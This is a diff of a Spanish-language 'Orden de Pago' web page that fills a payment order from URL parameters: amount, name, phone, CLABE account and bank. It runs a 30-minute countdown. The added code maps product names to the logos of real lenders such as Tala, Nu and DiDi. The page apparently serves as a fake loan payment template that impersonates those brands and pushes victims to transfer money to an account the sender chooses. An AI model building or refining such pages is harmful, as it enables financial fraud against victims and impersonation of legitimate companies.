@@ -6,64 +6,45 @@
     <title>Orden de Pago</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800;900&display=swap');
-        
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body { 
-            font-family: 'Inter', sans-serif; 
-            margin: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-            min-height: 100vh;
-            background-color: #000; 
-        }
-
-        .video-wrapper {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
-        }
-
-        #bg-video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            filter: brightness(0.5); 
-        }
-
-        .card { 
-            width: 90%; 
-            max-width: 420px; 
-            background: rgba(255, 255, 255, 0.95); 
-            backdrop-filter: blur(10px);
-            border-radius: 40px; 
-            overflow: hidden; 
-            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
-            position: relative;
-            margin: 20px 0;
-        }
-
+        body { font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #000; }
+        .video-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; }
+        #bg-video { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.5); }
+        .card { width: 90%; max-width: 420px; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-radius: 40px; overflow: hidden; box-shadow: 0 25px 50px rgba(0,0,0,0.6); position: relative; margin: 20px 0; }
         video::-webkit-media-controls { display:none !important; }
+        
+        /* Contenedor del Logo */
+        .logo-container {
+            width: 70px;
+            height: 70px;
+            background: white;
+            border-radius: 20px;
+            margin: 0 auto 15px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 3px solid rgba(255,255,255,0.3);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        }
+        .logo-container img { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
 
     <div class="video-wrapper">
-        <video autoplay muted loop playsinline id="bg-video" poster="https://pixabay.com/static/img/logo_square.png">
+        <video autoplay muted loop playsinline id="bg-video">
             <source src="https://cdn.pixabay.com/video/2019/07/26/25696-351221711_large.mp4" type="video/mp4">
-            Tu navegador no soporta videos.
         </video>
     </div>
 
     <div class="card">
-        <div style="background-color: #14b8a6; color: white; padding: 35px 20px; text-align: center;">
+        <div id="header-color" style="background-color: #14b8a6; color: white; padding: 30px 20px; text-align: center;">
+            <div class="logo-container">
+                <img id="img-logo" src="https://i.ibb.co/qF6Vvqy/tala-te-presta.png" alt="Logo">
+            </div>
             <p style="font-size: 10px; font-weight: 800; letter-spacing: 1.5px; margin: 0; text-transform: uppercase;">Orden de Pago</p>
-            <h1 id="txt-prod" style="font-size: 28px; font-weight: 900; margin: 5px 0 0 0; text-transform: uppercase;">TALA PRÉSTAMOS</h1>
+            <h1 id="txt-prod" style="font-size: 24px; font-weight: 900; margin: 5px 0 0 0; text-transform: uppercase;">TALA PRÉSTAMOS</h1>
         </div>
 
         <div style="padding: 25px;">
@@ -107,31 +88,40 @@
             </div>
 
             <button onclick="copiarEnlace()" style="width: 100%; background-color: #1e293b; color: white; padding: 18px; border-radius: 20px; font-weight: 800; font-size: 13px; border: none; margin-top: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; text-transform: uppercase;">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>
                 Copiar Link de Pago
             </button>
         </div>
     </div>
 
     <script>
-        window.addEventListener('load', function() {
-            var video = document.getElementById('bg-video');
-            video.play().catch(function(error) {
-                console.log("Auto-play bloqueado por el navegador");
-            });
-        });
-
         const urlParams = new URLSearchParams(window.location.search);
-        const start = parseInt(urlParams.get('s')) || Date.now();
         
+        // MAPEO DE LOGOS SEGÚN EL PRODUCTO
+        const logos = {
+            "TALA PRÉSTAMOS": "https://i.ibb.co/qF6Vvqy/tala-te-presta.png",
+            "PRÉSTAMOS NU": "https://logodownload.org/wp-content/uploads/2019/08/nu-nubank-logo.png",
+            "DIDAPRÉSTAMOS": "https://images.squarespace-cdn.com/content/v1/598db46b725e2547b3196020/1586539223846-I6O51M85N2P5A99B9V2S/didi-logo.png",
+            "PRÉSTAMOS RÁPIDOS": "https://cdn-icons-png.flaticon.com/512/2168/2168816.png",
+            "WORLDMOXPRO GG": "https://cdn-icons-png.flaticon.com/512/825/825590.png",
+            "TALA CRÉDITO": "https://i.ibb.co/qF6Vvqy/tala-te-presta.png",
+            "MOVIL CASH": "https://cdn-icons-png.flaticon.com/512/1043/1043432.png",
+            "PRÉSTAMOS DE DINERO": "https://cdn-icons-png.flaticon.com/512/2488/2488749.png",
+            "PRÉSTAMOS": "https://cdn-icons-png.flaticon.com/512/2845/2845812.png"
+        };
+
+        const prodNombre = urlParams.get('pr') || "TALA PRÉSTAMOS";
+        document.getElementById('txt-prod').innerText = prodNombre;
+        document.getElementById('img-logo').src = logos[prodNombre] || logos["PRÉSTAMOS"];
+
         document.getElementById('txt-monto').innerText = "$" + (urlParams.get('m') || "0.00");
         document.getElementById('txt-nom').innerText = (urlParams.get('n') || "Cliente").toUpperCase();
-        document.getElementById('txt-tel').innerText = urlParams.get('t') || "0000000000"; // CAPTURA TELÉFONO
+        document.getElementById('txt-tel').innerText = urlParams.get('t') || "0000000000";
         document.getElementById('txt-fec').innerText = urlParams.get('f') || "2026-03-07";
-        document.getElementById('txt-prod').innerText = urlParams.get('pr') || "TALA PRÉSTAMOS";
         document.getElementById('txt-clabe').innerText = urlParams.get('cl') || "000000000000000000";
         document.getElementById('txt-banco-label').innerText = "TRANSFERENCIA " + (urlParams.get('b') || "MERCADO PAGO") + " (SPEI)";
 
+        // Timer y Copiar (Igual que antes)
+        const start = parseInt(urlParams.get('s')) || Date.now();
         function updateTimer() {
             const diff = (30 * 60 * 1000) - (Date.now() - start);
             if (diff <= 0) { document.getElementById('timer').innerText = "00:00"; return; }
@@ -147,7 +137,6 @@
             navigator.clipboard.writeText(texto);
             alert("Copiado: " + texto);
         }
-
         function copiarEnlace() {
             navigator.clipboard.writeText(window.location.href);
             alert("Link de pago copiado.");
